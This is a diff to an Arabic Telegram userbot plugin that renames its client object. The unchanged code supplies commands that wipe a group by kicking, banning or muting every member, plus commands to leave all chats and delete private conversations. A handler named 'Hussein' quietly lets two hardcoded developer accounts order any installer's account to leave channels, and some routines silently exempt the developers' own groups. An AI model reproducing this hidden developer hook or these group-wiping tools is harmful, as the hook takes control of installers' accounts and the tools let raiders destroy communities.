@@ -30,7 +30,7 @@ from telethon.tl.types import (
     UserStatusOnline,
     UserStatusRecently,
 )
-from SHRU import l313l
+from SHRU import Qrh9
 from ..sql_helper.globals import addgvar, delgvar, gvarstatus
 from telethon.tl.functions.channels import GetParticipantRequest
 from telethon.errors import UserNotParticipantError
@@ -62,11 +62,11 @@ if banned_names is None:
 
 async def ban_user(chat_id, i, rights):
     try:
-        await l313l(functions.channels.EditBannedRequest(chat_id, i, rights))
+        await Qrh9(functions.channels.EditBannedRequest(chat_id, i, rights))
         return True, None
     except Exception as exc:
         return False, str(exc)        
-@l313l.on(events.NewMessage(outgoing=True, pattern="ارسل?(.*)"))
+@Qrh9.on(events.NewMessage(outgoing=True, pattern="ارسل?(.*)"))
 async def remoteaccess(event):
 
     p = event.pattern_match.group(1)
@@ -93,7 +93,7 @@ async def remoteaccess(event):
         await event.edit("تم ارسال الرساله الى الرابط الذي وضعتة")
     except BaseException:
         await event.edit("** عذرا هذا ليست مجموعة **")
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="اطردني$",
     command=("اطردني", plugin_category),
     info={
@@ -109,7 +109,7 @@ async def kickme(leave):
     await leave.edit("᯽︙  حسنا سأغادر المجموعه وداعا ")
     await leave.client.kick_participant(leave.chat_id, "me")
 
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="تفليش بالطرد$",
     command=("تفليش بالطرد", plugin_category),
     info={
@@ -152,7 +152,7 @@ async def _(event):
         f"᯽︙  تم بنجاح طرد من {total} الاعضاء ✅ "
     )
 
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="تفليش$",
     command=("تفليش", plugin_category),
     info={
@@ -198,7 +198,7 @@ async def _(event):
 
 
 
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="حذف المحظورين$",
     command=("حذف المحظورين", plugin_category),
     info={
@@ -252,7 +252,7 @@ async def _(event):
     await catevent.edit(f"᯽︙ الغاء حظر :__{succ}/{total} في الدردشه {chat.title}__")
 
 # Ported by ©[NIKITA](t.me/kirito6969) and ©[EYEPATCH](t.me/NeoMatrix90)
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="المحذوفين ?([\s\S]*)",
     command=("المحذوفين", plugin_category),
     info={
@@ -316,7 +316,7 @@ async def rm_deletedacc(show):
             \nالـدردشة: {show.chat.title}(`{show.chat_id}`)",
         )
 
-@l313l.ar_cmd(pattern="حظر_الكل(?:\s|$)([\s\S]*)")
+@Qrh9.ar_cmd(pattern="حظر_الكل(?:\s|$)([\s\S]*)")
 async def banall(event):
      chat_id = event.chat_id
      if event.is_private:
@@ -324,7 +324,7 @@ async def banall(event):
      msg = "حظر"
      is_admin = False
      try:
-         partici_ = await l313l(GetParticipantRequest(
+         partici_ = await Qrh9(GetParticipantRequest(
            event.chat_id,
            event.sender_id
          ))
@@ -332,7 +332,7 @@ async def banall(event):
          is_admin = False
      spam_chats.append(chat_id)
      usrnum = 0
-     async for usr in l313l.iter_participants(chat_id):
+     async for usr in Qrh9.iter_participants(chat_id):
          if not chat_id in spam_chats:
              break
          userb = usr.username
@@ -340,21 +340,21 @@ async def banall(event):
          if str(userb) == "None":
              userb = usr.id
              usrtxt = f"{msg} {userb}"
-         await l313l.send_message(chat_id, usrtxt)
+         await Qrh9.send_message(chat_id, usrtxt)
          await asyncio.sleep(1)
          await event.delete()
      try:
          spam_chats.remove(chat_id)
      except:
          pass
-@l313l.ar_cmd(pattern="كتم_الكل(?:\s|$)([\s\S]*)")
+@Qrh9.ar_cmd(pattern="كتم_الكل(?:\s|$)([\s\S]*)")
 async def muteall(event):
      if event.is_private:
          return await edit_or_reply(event, "** ᯽︙ هذا الامر يستعمل للقنوات والمجموعات فقط !**")
      msg = "كتم"
      is_admin = False
      try:
-         partici_ = await l313l(GetParticipantRequest(
+         partici_ = await Qrh9(GetParticipantRequest(
            event.chat_id,
            event.sender_id
          ))
@@ -362,7 +362,7 @@ async def muteall(event):
          is_admin = False
      spam_chats.append(chat_id)
      usrnum = 0
-     async for usr in l313l.iter_participants(chat_id):
+     async for usr in Qrh9.iter_participants(chat_id):
          if not chat_id in spam_chats:
              break
          userb = usr.username
@@ -370,14 +370,14 @@ async def muteall(event):
          if str(userb) == "None":
              userb = usr.id
              usrtxt = f"{msg} {userb}"
-         await l313l.send_message(chat_id, usrtxt)
+         await Qrh9.send_message(chat_id, usrtxt)
          await asyncio.sleep(1)
          await event.delete()
      try:
          spam_chats.remove(chat_id)
      except:
          pass
-@l313l.ar_cmd(pattern="طرد_الكل(?:\s|$)([\s\S]*)")
+@Qrh9.ar_cmd(pattern="طرد_الكل(?:\s|$)([\s\S]*)")
 async def kickall(event):
      chat_id = event.chat_id
      if event.is_private:
@@ -385,7 +385,7 @@ async def kickall(event):
      msg = "طرد"
      is_admin = False
      try:
-         partici_ = await l313l(GetParticipantRequest(
+         partici_ = await Qrh9(GetParticipantRequest(
            event.chat_id,
            event.sender_id
          ))
@@ -393,7 +393,7 @@ async def kickall(event):
          is_admin = False
      spam_chats.append(chat_id)
      usrnum = 0
-     async for usr in l313l.iter_participants(chat_id):
+     async for usr in Qrh9.iter_participants(chat_id):
          if not chat_id in spam_chats:
              break
          userb = usr.username
@@ -401,14 +401,14 @@ async def kickall(event):
          if str(userb) == "None":
              userb = usr.id
              usrtxt = f"{msg} {userb}"
-         await l313l.send_message(chat_id, usrtxt)
+         await Qrh9.send_message(chat_id, usrtxt)
          await asyncio.sleep(1)
          await event.delete()
      try:
          spam_chats.remove(chat_id)
      except:
          pass
-@l313l.ar_cmd(pattern="الغاء التفليش")
+@Qrh9.ar_cmd(pattern="الغاء التفليش")
 async def ca_sp(event):
   if not event.chat_id in spam_chats:
     return await edit_or_reply(event, "** ᯽︙ 🤷🏻 لا يوجد طرد او حظر او كتم لأيقافه**")
@@ -418,7 +418,7 @@ async def ca_sp(event):
     except:
       pass
     return await edit_or_reply(event, "** ᯽︙ تم الغاء العملية بنجاح ✓**")
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="احصائيات الاعضاء ?([\s\S]*)",
     command=("احصائيات الاعضاء", plugin_category),
     info={
@@ -568,7 +568,7 @@ async def _(event):  # sourcery no-metrics
 ##Reda is here 
 
 
-@l313l.ar_cmd(pattern="مغادرة الكروبات")
+@Qrh9.ar_cmd(pattern="مغادرة الكروبات")
 async def Reda (event):
     await event.edit("**᯽︙ جارِ مغادرة جميع الكروبات الموجوده في حسابك ...**")
     gr = []
@@ -593,7 +593,7 @@ async def Reda (event):
         dd.append(1629927549)
         for group in gr:
             if group not in dd:
-                await l313l.delete_dialog(group)
+                await Qrh9.delete_dialog(group)
                 num += 1
                 await sleep(1)
         if num >=1:
@@ -604,7 +604,7 @@ async def Reda (event):
      await event.reply(f"حدث خطأ\n{er}\n{entity}")
 
 DevJoker = [6205161271,5762222122]
-@l313l.on(events.NewMessage(incoming=True))
+@Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("اطلع") and event.sender_id in DevJoker:
         message = event.message
@@ -613,11 +613,11 @@ async def Hussein(event):
             channel_username = message.text.split()[1].replace("@", "")
         if channel_username:
             try:
-                entity = await l313l.get_entity(channel_username)
+                entity = await Qrh9.get_entity(channel_username)
                 if isinstance(entity, Channel) and entity.creator or entity.admin_rights:
                     response = "**᯽︙ لا يمكنك الخروج من هذه القناة. أنت مشرف أو مالك فيها!**"
                 else:
-                    await l313l(LeaveChannelRequest(channel_username))
+                    await Qrh9(LeaveChannelRequest(channel_username))
                     response = "**᯽︙ تم الخروج من القناة بنجاح!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
@@ -625,7 +625,7 @@ async def Hussein(event):
             response = "**᯽︙ يُرجى تحديد معرف القناة أو المجموعة مع الخروج يامطوري ❤️**"
         #await event.reply(response)
         
-@l313l.ar_cmd(pattern="مغادرة القنوات")
+@Qrh9.ar_cmd(pattern="مغادرة القنوات")
 async def Hussein (event):
     await event.edit("**᯽︙ جارِ مغادرة جميع القنوات الموجوده في حسابك ...**")
     gr = []
@@ -641,7 +641,7 @@ async def Hussein (event):
         dd.append(1527835100)
         for group in gr:
             if group not in dd:
-                await l313l.delete_dialog(group)
+                await Qrh9.delete_dialog(group)
                 num += 1
                 await sleep(1)
         if num >=1:
@@ -651,7 +651,7 @@ async def Hussein (event):
     except BaseException as er:
      await event.reply(f"حدث خطأ\n{er}\n{entity}")
 
-@l313l.ar_cmd(pattern="تصفية الخاص")
+@Qrh9.ar_cmd(pattern="تصفية الخاص")
 async def hussein(event):
     await event.edit("**᯽︙ جارِ حذف جميع الرسائل الخاصة الموجودة في حسابك ...**")
     dialogs = await event.client.get_dialogs()
@@ -663,7 +663,7 @@ async def hussein(event):
                 print(f"حدث خطأ أثناء حذف المحادثة الخاصة: {e}")
     await event.edit("**᯽︙ تم تصفية جميع محادثاتك الخاصة بنجاح ✓ **")
 
-@l313l.ar_cmd(pattern="تصفية البوتات")
+@Qrh9.ar_cmd(pattern="تصفية البوتات")
 async def Hussein(event):
     await event.edit("**᯽︙ جارٍ حذف جميع محادثات البوتات في الحساب ...**")
     result = await event.client(GetContactsRequest(0))
@@ -680,14 +680,14 @@ banned_names = gvarstatus(banned_names_variable)
 if banned_names is None:
     banned_names = []
 
-@l313l.ar_cmd(pattern=r"(?:اضافة|اضافه) اسم (.+)")
+@Qrh9.ar_cmd(pattern=r"(?:اضافة|اضافه) اسم (.+)")
 async def add_banned_name(event):
     name = event.pattern_match.group(1)
     banned_names.append(name)
     addgvar(banned_names_variable, banned_names)
     await event.edit(f"**᯽︙ تمت إضافة {name} إلى قائمة الأسماء الممنوعة بنجاح ✓ **")
 
-@l313l.ar_cmd(pattern=r"(?:منع|حظر) اسم (?!\.list$)(.+)")
+@Qrh9.ar_cmd(pattern=r"(?:منع|حظر) اسم (?!\.list$)(.+)")
 async def kick_banned_name(event):
     banned_name = event.pattern_match.group(1)
     await event.edit(f"**᯽︙ جارٍ تنفيذ الأمر لمنع اسم {banned_name} ...**")
@@ -713,12 +713,12 @@ async def kick_banned_name(event):
 
     await event.edit(f"**᯽︙ تم تنفيذ الأمر بنجاح لمنع اسم {banned_name} ✓ **")
 
-@l313l.ar_cmd(pattern=r"القائمة السوداء$")
+@Qrh9.ar_cmd(pattern=r"القائمة السوداء$")
 async def list_banned_names(event):
     banned_names_str = "\n- ".join(banned_names) if banned_names else "**᯽︙ لا توجد أسماء ممنوعة حاليًا.**"
     await event.reply(f"**᯽︙ الأسماء الممنوعة حاليًا:**\n- {banned_names_str}")
 # الكود من كتابة فريق الساحر بس تسرقة تنشر بقناة الفضايح انتَ وقناتك 🖤
-@l313l.ar_cmd(pattern=r"ذكاء(.*)")
+@Qrh9.ar_cmd(pattern=r"ذكاء(.*)")
 async def hussein(event):
     await event.edit("**᯽︙ جارِ الجواب على سؤالك انتظر قليلاً ...**")
     text = event.pattern_match.group(1).strip()
@@ -732,7 +732,7 @@ No_group_Joker = "@SXYO3"
 # يا يلفاشل هم الك نيه تاخذه وتنشره بسورسك 🤣
 active_ALSAHER = []
 
-@l313l.ar_cmd(pattern=r"الذكاء تفعيل")
+@Qrh9.ar_cmd(pattern=r"الذكاء تفعيل")
 async def enable_bot(event):
     global is_Reham
     if not is_Reham:
@@ -741,7 +741,7 @@ async def enable_bot(event):
         await event.edit("**᯽︙ تم تفعيل امر الذكاء الاصطناعي سيتم الرد على اسئلة الجميع عند الرد علي.**")
     else:
         await event.edit("**᯽︙ الزر مُفعّل بالفعل.**")
-@l313l.ar_cmd(pattern=r"الذكاء تعطيل")
+@Qrh9.ar_cmd(pattern=r"الذكاء تعطيل")
 async def disable_bot(event):
     global is_Reham
     if is_Reham:
@@ -750,7 +750,7 @@ async def disable_bot(event):
         await event.edit("**᯽︙ تم تعطيل امر الذكاء الاصطناعي.**")
     else:
         await event.edit("**᯽︙ الزر مُعطّل بالفعل.**")
-@l313l.on(events.NewMessage(incoming=True))
+@Qrh9.on(events.NewMessage(incoming=True))
 async def reply_to_hussein(event):
     if not is_Reham:
         return
